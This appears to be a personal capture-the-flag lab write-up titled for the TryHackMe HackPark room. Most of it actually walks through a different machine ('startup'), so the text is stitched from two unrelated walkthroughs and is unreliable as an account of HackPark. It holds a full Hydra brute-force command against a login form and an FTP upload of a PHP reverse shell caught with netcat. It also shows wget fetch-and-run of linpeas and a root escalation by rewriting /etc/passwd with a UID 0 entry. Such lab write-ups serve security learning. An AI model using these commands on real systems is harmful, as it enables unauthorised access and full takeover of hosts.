# THM-HackPark
https://tryhackme.com/room/hackpark

I did this as a part of the Offensive Pentesting Learning Path

## Task 1
### Whats the name of the clown displayed on the homepage?
Open the ip adress in a browser.
Download the image of the clown and use Google to serch for that image.

## Task 2
### What request type is the Windows website login form using?
Use Developer Tools and Network Display to see what type of request the form is making.

### Guess a username, choose a password wordlist and gain credentials to a user account!
The server is using Blog Engine, and the default can be found on [there server](https://blogengine.io)
Now use Burp Suite to se what´s sent during logon to http://IP.ad.dr.es/admin
All new for me was the VIEWSTATE= part used during login.
Copy VIEWSTATE and make a Hydra password attack command
I used:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.19.178 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=97hlUt22e85aQD6CzwY82BVD9mqEeUj7nT8LT5JU%2B%2BHqmx9hzpOsGUGR91TmR1nxGBEc%2BXbGEY5jnb9IKCpEz3Bglz1KZRTTKnK3CGBpxgvWG5XvUReWcC4sWXOKtf8%2BLnAVFpfWtjjuSo%2B2xtGjDmeM1dYU1jcO4yYRw9viAzEkYuYj&__EVENTVALIDATION=BrCmhMtOml%2FrMjoO4%2F6vd%2FMu2F494JfLYNvR4pgYfFAnV4tn53%2FQCuTdGS3fLwNE%2F1IPWuy1PeHKg2N1AUtiYffQYrtYHZoRLEYUsCj9PnBUB7yLFz8JOV6qIyYJVALgjx8rWK7eXPE9fFkUWC6NeNdq322T%2B6G8dezO855lYGCZFepG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv

(hydra -l user -P wordlist IP_ADDR http-post-form-type login-URI-and-return-Url "VIEWSTATE" modify UserName=^USER^ and Password=^PASS^, end with "error command" and -vv (verbose)






### Nmap (top 1000 ports with script scan)
```
nmap 10.10.225.190 -sC
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 

22/tcp open  ssh
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http
|_http-title: Maintenance
```
We get that port 21, 22 and port 80 are open.
Because we used -sC we also get some extra info about FTP.
We can login as Anonumous and the ftp folder is writable.
We also get FTP and SSH server versions.
*************
### Dirbuster

```
dirb http://10.10.96.196 -w /usr/share/wordlists/dirb/common.txt

http://10.10.96.196/index.html
http://10.10.96.196/files/ftp/ 
```
Dirbuster shows that we can access the FTP folder from HTTP, **thats interesting** .
*******
### HTTP
The main web page is just a http file with nothing interesting.<br>
**But if we try the /files folder we get this!**<br>
![image](https://user-images.githubusercontent.com/93491173/216457959-4ac23f3e-f451-4385-82ff-23bda5fc37e2.png)<br>
The /ftp folder is empty.
*******
### FTP
The ftp folder writable, lets see what we can do with that.
We can start to upload pentestmonkey.php reverse shell.
```
ftp Anonymous@IPADRESS
no passwd

cd ftp
ftp> put
local: /home/kali/THM/Startup/Files/pentestmonkey.php remote: pentestmonkey.php
```
That worked fine, and its shows up in the browser.
*********
### Reverse shell
Lets try to get a revers shell running.
```
(local host) nc -nlvp 4444
```
Open the pentestmonkey.php in the web browser, we are connected!
*********
### Spawn a shell thru Python
Now we need a usable shell, let use Python to launch a shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
**********
### The secret recipe
Read the file /recipe.txt
```
www-data@startup:/$ cat /recipe.txt
cat /recipe.txt
Someone asked what our main ingredient to our spice soup is today. 
I figured I can't keep it a secret forever and told him it was ****.
```
**********
### Linpeas (finding a weakness)
2 ways to get the Linpeas script oto the host.
1. 
```
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230205/linpeas.sh
chmod +x linpeas.sh
```

```
download to LHOST
start a http server on LHOST
python -m http.server 53

Download to RHOST
cd /tmp
wget http://LHOST-IP:53/linpeas.sh
chmod +x linpeas.sh
```
Now lets run Linpeas
```
www-data@startup:/tmp$ ./linpeas.sh
```
Here we can se a suspicius file **/incidents/suspicious.pcapng**
Transfere the file to the LHOST using the FTP folder.
```
Copy file to HTTP/FTP folder. 
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
Dowload the file from: 
http://RHOST/files/ftp/suspicius.pcapng
```
### Wireshark
Start Wireshark and load the suspicius.pcapng <br>
Look for some kind of terminal action. <br>
If we the follow the TCP connection we can se exacly what that user did, and what password he tried to use<br>
![image](https://user-images.githubusercontent.com/93491173/216831507-48ef88e4-9e90-4ca4-8d9b-cfe44d21862c.png) <br>
Right click that row, Follow, TCP connection.<br>
Then we can se this:
```
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: ***********
```
It looks like someone is trying to elevate but are using the wrong command. I think someone is trying to access something in lennies home folder, lets try lennie and that password first.
<br>
```
www-data@startup:/$ su lennie
su lennie
Password: **********
```
Great job, that worked fine.
### user.txt
Now its time to check out that user.txt flag.
```
lennie@startup:/$ cd /home/lennie
cd /home/lennie
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
cat user.txt
THM{**********}
```
### root(.txt)
Now its time to get access to the /root folder.<br>
In lennies folder there are a script folder.<br>
It contains planner.sh and startup_list.txt. <br>
planner.sh calls $LIST and adds it to plannet_list.txt and then run /etc/print.sh<br>
/etc/print.sh is writable and we can add any command that we want to run as root.<br>
if we add 
```
cat /root/root.txt 
```
we get the flag from root.txt.<br>

If we add this instead:
```
echo 'chmod ugo+rwx /etc/passwd' > /etc/print.sh
```
we will have full access to passwd.<br>
Now we can give our self root access.
```
cat /etc/passwd
```
Use cat output and make a new passwd on LHOST.
```
vi passwd 
change
lennie:x:1002:1002::/home/lennie:
to
lennie:x:0:0::/home/lennie:/bin/bash
[esc] 
:wq
```
This makes him member of root and gives him root access.<br>
Upload the file to RHOST, copy to /etc/passwd.
```
ftp Anonymous@IPADRESS
no passwd

cd ftp
ftp> put
local: passwd remote: passwd
cp /var/www/html/files/ftp/passwd /etc/passwd
```
### Login as root
First you need to logout<br>
And the login with root access
```
exit
www-data@startup:/$ su lennie
lennie
Password: *********
```
### You are now root!
